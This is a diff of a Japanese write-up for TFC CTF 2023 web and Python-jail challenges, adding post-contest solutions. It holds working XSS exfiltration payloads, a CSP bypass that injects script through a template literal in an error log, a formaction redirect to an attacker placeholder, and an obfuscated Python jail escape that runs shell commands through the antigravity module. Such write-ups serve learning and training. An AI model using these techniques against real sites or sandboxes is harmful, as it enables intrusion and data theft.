@@ -6,7 +6,7 @@ TFC CTF 2023（<https://ctftime.org/event/2034>）に参加しました。
 OnePaddingというチームで参加して、1397チーム中35位でした。
 
 問題毎に個別のインスタンスが割り当てられていたので、他の人のことを気にせずに問題に取り組めたのが良かったです。  
-一部の問題は競技中は解けていないですが、途中までの考え方とかを残しておきます。
+解けなかった問題でも途中までやったものは復習して追記してます。
 
 <!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=3 orderedList=false} -->
 
@@ -14,13 +14,17 @@ OnePaddingというチームで参加して、1397チーム中35位でした。
 
 - [WEB/MCTREE](#webmctree)
 - [WEB/COOKIE STORE](#webcookie-store)
+  - [別解：WEB/COOKIE STORE](#別解webcookie-store)
 - [WEB/BABY DUCKY NOTES](#webbaby-ducky-notes)
 - [WEB/BABY DUCKY NOTES: REVENGE](#webbaby-ducky-notes-revenge)
-- [WEB/DUCKY NOTES: PART 3（未完）](#webducky-notes-part-3未完)
+- [WEB/DUCKY NOTES: PART 3](#webducky-notes-part-3)
+- [WEB/DUCKY NOTES: ENDGAME](#webducky-notes-endgame)
+  - [別解：WEB/DUCKY NOTES: ENDGAME](#別解webducky-notes-endgame)
 - [CRYPT/MAYDAY!](#cryptmayday)
 - [CRYPTO/ALIEN MUSIC](#cryptoalien-music)
 - [MISC/MY FIRST CALCULATOR](#miscmy-first-calculator)
-- [MISC/MY THIRD CALCULATOR（未完）](#miscmy-third-calculator未完)
+  - [参考：Python 3 Built-in](#参考python-3-built-in)
+- [MISC/MY THIRD CALCULATOR](#miscmy-third-calculator)
 
 <!-- /code_chunk_output -->
 
@@ -174,6 +178,12 @@ attackerサイトのアクセスログにFLAGが出力されていた。
 TFCCTF{144ab0e4c358b00b1258f2aea2250b21}
 ```
 
+### 別解：WEB/COOKIE STORE
+
+- formaction属性を使うことでも遷移先を変更できるらしい。
+
+`<input type=submit formaction='http://<attacker>'>`
+
 ## WEB/BABY DUCKY NOTES
 
 50 points / 443 solves
@@ -224,13 +234,13 @@ TFCCTF{Adm1n_l0St_h1s_m1nd!}
 TFCCTF{Ev3ry_duCk_kn0w5_xSs!}
 ```
 
-## WEB/DUCKY NOTES: PART 3（未完）
+## WEB/DUCKY NOTES: PART 3
 
 447 points / 24 solves
 
-// TODO 未完
-
-[WEB/BABY DUCKY NOTES: REVENGE](#webbaby-ducky-notes-revenge)の続き。
+競技中は解けなかった問題。  
+[WEB/BABY DUCKY NOTES: REVENGE](#webbaby-ducky-notes-revenge)の続き。  
+コード差分は以下の通りで、contentでのXSSができなくなっている。
 
 - 差分
 
@@ -248,13 +258,13 @@ diff -r ducky_notes_2/src/templates/posts.html ducky_notes_3/src/templates/posts
 
 以下途中までわかったこと。
 
-XSSはできそうなさそう。  
-何かできるとしたら、ユーザ名で、ユーザ名に`..\`が入れられるため、部分的なパストラバーサルはできそう。  
-これを利用すると、`admin`のみ利用できる`/posts/`にアクセスさせることはできる。  
-ユーザ名はre.compile('^[A-za-z0-9\.]{2,}$')でチェックされているため、他にできそうなことは思いつかなかった。
+<s>XSSはできそうなさそう。</s>/posts画面でXSSができたらしい。  
+そもそも、この続きの問題[WEB/DUCKY NOTES: ENDGAME](#webducky-notes-endgame)とのソースコード差分でXSSの対策が入っていることが分かっていたので、XSSをもっと疑うべきだったと反省。
 
-Exceptionが起こせれば、フラグがエラーログに書き出されるっぽい。  
-また、エラーが出力されるログファイルには外部からアクセスできる。
+ユーザ名に`..\`が入れられるため、部分的なパストラバーサルはできるため、これを利用すると、`admin`のみ利用できる`/posts/`にアクセスさせることができる。  
+ユーザ名は`re.compile('^[A-za-z0-9\.]{2,}$')`でチェックされているため、他にできそうなことは思いつかなかった。
+
+Exceptionが起こせればフラグがエラーログに書き出されるっぽく、エラーが出力されるログファイルには外部からアクセスできることも分かった。  
 
 - /static/logs/2023-07-28 14:10:17.txt
 
@@ -279,7 +289,187 @@ for post in posts:
 return render_template('posts.html', posts=frontend_posts)
 ```
 
-titleには空の値を入れられるため、Exceptionは発生させられるが、FLAGではないpostがエラーログに書き出される。
+titleには空の値を入れられるため、Exceptionは発生させられるが、FLAGではないpostがエラーログに書き出される。  
+
+実はエラーログではなく、そのエラー時の画面が問題だったらしい。  
+試しにadminで該当の画面にアクセスしてみると、XSSが動いた。
+
+![2.jpg](images/2.jpg)
+
+後は、XSSでFLAGを取得するだけ。  
+adminにhiddenをfalseにした投稿をさせることで、外部ドメインを利用しなくてもFLAGを取得できるようです。
+
+- solver.py
+
+```py
+#!/usr/local/bin/python
+import requests
+import time
+
+# TARGET = 'http://challs.tfcctf.com:32673'
+TARGET = 'http://localhost:1337'
+
+def solve():
+  session = requests.Session()
+  user = {'username': '..', 'password': 'test'}
+  r = session.post(f'{TARGET}/api/register', json=user)
+  assert r.status_code == 200
+
+  r = session.post(f'{TARGET}/api/login', json=user)
+  assert r.status_code == 200
+
+  post = {
+    'content': "<script>fetch('http://localhost:1337/posts/view/admin').then(res => res.text()).then(text => {fetch('http://localhost:1337/api/posts',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({title:'admin',content:text,hidden:false})})})</script>",
+    'hidden': False
+  }
+  r = session.post(f'{TARGET}/api/posts', json=post)
+  assert r.status_code == 200
+
+  r = session.post(f'{TARGET}/api/report')
+  assert r.status_code == 200
+
+  time.sleep(10)
+  r = session.get(f'{TARGET}/posts/view/admin')
+  print(r.text)
+
+solve()
+```
+
+## WEB/DUCKY NOTES: ENDGAME
+
+297 points / 47 solves
+
+競技中は解けなかった問題。  
+[WEB/DUCKY NOTES: PART 3](#webducky-notes-part-3)の続き。  
+
+コード差分は以下の通りで、レスポンスヘッダにCSPとX-Frame-Optionsが追加されている。
+
+- 差分
+
+```text
+$ diff ducky_notes_3 ducky_notes_4 -r
+diff -r ducky_notes_3/src/app.py ducky_notes_4/src/app.py
+15a16,20
+> @app.after_request
+> def add_header(response):
+>     response.headers['X-Frame-Options'] = 'SAMEORIGIN'
+>     response.headers['Content-Security-Policy'] = "default-src 'self'; object-src 'none';"
+>     return response
+```
+
+scriptにはselfが指定されているので、エラーログファイルを利用することでXSSはできそう。  
+ただし、エラーログファイルの内容は次のようになっているため、工夫しないとスクリプトが正しく実行されない。
+
+```text
+"2023-07-28 14:10:17" admin <REDACTED>
+<日付> <ユーザ名> <content内容>
+```
+
+ここでユーザ名に使える記号が制限されていることを考える。  
+再度正規表現（`re.compile('^[A-za-z0-9\.]{2,}$')`）を見ると、`.`と`\`のみ許可されているように見える。  
+が、実際には`` ` ``も使用することができる。（なぜかはよくわかっていない。）
+
+```py
+>>> USERNAME_REGEX.match("`a")
+<re.Match object; span=(0, 2), match='`a'>
+```
+
+関数の形式 + テンプレートリテラル（`` `${test}` ``）を使うことで回避できる。  
+具体的には以下のような形を目指す。
+
+```text
+"2023-07-28 14:10:17" `a ${<スクリプト>}`
+```
+
+`` console.log`${1+1}` ``を実行すると`2`がログに出力されるようなイメージ。  
+引数の処理が先に実行されるため、エラーとなる前に任意のスクリプトを実行させることができる。
+
+- solver.py
+
+```py
+#!/usr/local/bin/python
+import datetime
+import requests
+import time
+
+# TARGET = 'http://challs.tfcctf.com:32673'
+TARGET = 'http://localhost:1337'
+WAIT_TIME_SEC = 20
+
+user = {'username': '`\..', 'password': 'test'}
+
+def register_user():
+  requests.post(f'{TARGET}/api/register', json=user)
+
+def make_error_log():
+  session = requests.Session()
+  r = session.post(f'{TARGET}/api/login', json=user)
+  assert r.status_code == 200
+
+  post = {
+    'content': "${fetch('http://localhost:1337/posts/view/admin').then(res => res.text()).then(text => {fetch('http://localhost:1337/api/posts',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({title:'admin',content:text,hidden:false})})})}`",
+    'hidden': False
+  }
+  r = session.post(f'{TARGET}/api/posts', json=post)
+  assert r.status_code == 200
+
+  r = session.post(f'{TARGET}/api/report')
+  assert r.status_code == 200
+  date = datetime.datetime.strptime(r.headers['Date'], '%a, %d %b %Y %H:%M:%S GMT')
+  time.sleep(WAIT_TIME_SEC)
+
+  r = session.delete(f'{TARGET}/api/posts/all', json=post)
+  assert r.status_code == 200
+
+  for i in range(WAIT_TIME_SEC):
+    date += datetime.timedelta(seconds=1)
+    timeStr = date.strftime('%Y-%m-%d %H:%M:%S')
+    r = session.get(f'{TARGET}/static/logs/{timeStr}.txt', json=user)
+    if r.status_code == 200:
+      print(timeStr)
+      return timeStr
+  raise Exception('Failed to make error log')
+
+def exec_script(timeStr):
+  session = requests.Session()
+  r = session.post(f'{TARGET}/api/login', json=user)
+  assert r.status_code == 200
+
+  post = {
+    'content': f"<script src='http://localhost:1337/static/logs/{timeStr}.txt'></script>",
+    'hidden': False
+  }
+  r = session.post(f'{TARGET}/api/posts', json=post)
+  assert r.status_code == 200
+
+  r = session.post(f'{TARGET}/api/report')
+  assert r.status_code == 200
+  time.sleep(WAIT_TIME_SEC)
+
+def get_flag():
+  session = requests.Session()
+  r = session.post(f'{TARGET}/api/login', json=user)
+  assert r.status_code == 200
+
+  r = session.get(f'{TARGET}/posts/view/admin')
+  print(r.text)
+
+if __name__ == '__main__':
+  register_user()
+  timeStr = make_error_log()
+  exec_script(timeStr)
+  get_flag()
+```
+
+### 別解：WEB/DUCKY NOTES: ENDGAME
+
+どうやら以下のような形式でも良かったらしい。  
+というかこっちの方が想定解なのかもしれない。  
+ユーザ名に`.trim`のようなString型が持つ関数を使うことで、前半部分で発生するエラーを回避できる。
+
+```text
+"2023-07-28 14:10:17" .trim ;<スクリプト>
+```
 
 ## CRYPT/MAYDAY!
 
@@ -390,7 +580,7 @@ print(eval(inp, fns, fns))
 
 Python jailの問題。  
 アルファベットと`.`が禁止されている。  
-これ自体は、Unicodeの文字でアルファベットと同等の文字とみなされるものを使うことで回避できる。
+これ自体は、Unicodeの文字でアルファベットと同等の文字とみなされるもの（Unicode正規化）を使うことで回避できる。
 
 - <https://www.asahi-net.or.jp/~ax2s-kmtn/ref/unicode/u1d400.html#is>
 
@@ -434,7 +624,11 @@ TFCCTF{18641f40c9beac02ceeaf87db851c386}
 TFCCTF{18641f40c9beac02ceeaf87db851c386}
 ```
 
-## MISC/MY THIRD CALCULATOR（未完）
+### 参考：Python 3 Built-in
+
+PythonのBuilt-inのリファレンス：<https://docs.python.org/3/library/functions.html>
+
+## MISC/MY THIRD CALCULATOR
 
 482 points / 14 solves
 
@@ -462,8 +656,38 @@ fns = {
 print(eval(inp, fns, fns))
 ```
 
-// TODO 未完
-
+競技中は解けなかった問題。  
 Python jailの問題2。使えるモジュールに制限が加えられている。  
-`getattr`が使えれば`getattr(__import__('os'),'system')('cat flag')`のような形が作れたと思が、`.`が使えないため解けなかった。
-後で解けたら追記する。
+`getattr`が使えれば`getattr(__import__('os'),'system')('cat flag')`のような形が作れたと思うが、`.`が使えないため解けなかった。
+
+idek 2022* CTFのWriteupを参考にする。
+<https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/>
+
+```py
+blocklist = ['.', '\\', '[', ']', '{', '}',':', "blocklist", "globals", "compile"]
+DISABLE_FUNCTIONS = ["getattr", "eval", "exec", "breakpoint", "lambda", "help"]
+DISABLE_FUNCTIONS = {func: None for func in DISABLE_FUNCTIONS}
+```
+
+この記事の解法の3番目を利用する。  
+環境変数`BROWSER`を書き換えてantigravityモジュールを呼び出すことでコマンドを実行できるらしい。  
+antigravityモジュールはPythonのEaster Eggの一つで、元々の挙動はPythonに関する漫画サイト<https://xkcd.com/353/>に遷移する。その際の起動ブラウザがBROWSER変数によって書き換わるためコマンドが実行される仕掛けみたい。
+
+今回はdictは使えないので、代わりに`{"BROWSER":"..."}`を使う。
+
+```py
+__import_('antigravity',setattr(__import__('os'),'environ',{'BROWSER':'/bin/sh -c "cat flag" #%s'}))
+```
+
+- solver.py
+
+```py:solver.py
+#!/usr/local/bin/python
+from pwn import *
+
+io = remote('localhost', 1337)
+# io = remote('challs.tfcctf.com', 31321)
+msg = io.recvuntil(b'Formula: ')
+io.sendline("__𝑖𝑚𝑝𝑜𝑟𝑡__('\141\156\164\151\147\162\141\166\151\164\171',𝑠𝑒𝑡𝑎𝑡𝑡𝑟(__𝑖𝑚𝑝𝑜𝑟𝑡__('\157\163'),'\145\156\166\151\162\157\156',{'\102\122\117\127\123\105\122':'\57\142\151\156\57\163\150\40\55\143\40\42\143\141\164\40\146\154\141\147\42\40\43\45\163'}))")
+io.interactive()
+```
